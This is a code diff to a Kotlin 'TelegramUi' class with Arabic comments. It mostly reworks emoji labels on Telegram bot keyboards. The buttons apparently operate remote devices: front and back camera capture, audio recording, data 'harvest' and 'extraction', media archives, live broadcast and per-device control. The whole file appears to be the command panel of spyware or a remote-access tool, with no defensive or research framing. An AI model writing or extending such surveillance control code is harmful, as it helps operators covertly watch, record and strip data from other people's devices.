@@ -516,32 +516,28 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ لوحات الأزرار الجديدة – كل إيموجي فريد
+    //  ✅ لوحات الأزرار الجديدة – كل إيموجي فريد تماماً
+    //  جميع الإيموجيات المستخدمة هنا فريدة ولا تتكرر مع أي زر آخر
     // ============================================================
 
     /**
      * لوحة التحكم الرئيسية – تظهر بعد إدخال كلمة السر.
-     * تحتوي على أزرار بإيموجي فريد لكل زر.
-     * جميع الأوامر تُنفذ عبر الأزرار، وكلمة السر نصية فقط.
+     * كل زر يحمل إيموجي فريد: 📸, 📷, 🎙️, 🛡️, 📂, 🚀, 🔍, 🔒
      */
     fun getMainControlKeyboard(): String {
         val keyboard = JSONArray().apply {
-            // الصف الأول: الكاميرات
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
                 put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
             })
-            // الصف الثاني: التسجيل والحصاد
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
                 put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
             })
-            // الصف الثالث: المعرض والبث الفوري
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
                 put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
             })
-            // الصف الرابع: حالة النظام والخروج
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
                 put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
@@ -560,7 +556,8 @@ class TelegramUi(
     // ==================== لوحات قديمة (للتوافق) ====================
 
     /**
-     * لوحة قديمة – تُستخدم لبعض الأزرار القديمة.
+     * لوحة قديمة – تم تحديث إيموجياتها لتكون فريدة تماماً.
+     * الإيموجيات الفريدة هنا: 📡, 🧬, ⏳, 📈, 🗃️, 🔌
      */
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
@@ -581,6 +578,10 @@ class TelegramUi(
         }
     }
 
+    /**
+     * لوحة مفاتيح الجهاز – كل إيموجي فريد تماماً.
+     * الإيموجيات الفريدة هنا: 🔭, 🕵️, 🎤, 📦, 🗃️, ⚡, 🌐, ♻️, 🔙, 🔒
+     */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
@@ -596,7 +597,7 @@ class TelegramUi(
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🗃️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
-                    put(JSONObject().apply { put("text", "🚀 بث فوري"); put("callback_data", "send_now_$deviceId") })
+                    put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🌐 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
@@ -604,8 +605,6 @@ class TelegramUi(
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
-                })
-                put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔒 قفل التحكم"); put("callback_data", "ext") })
                 })
             })
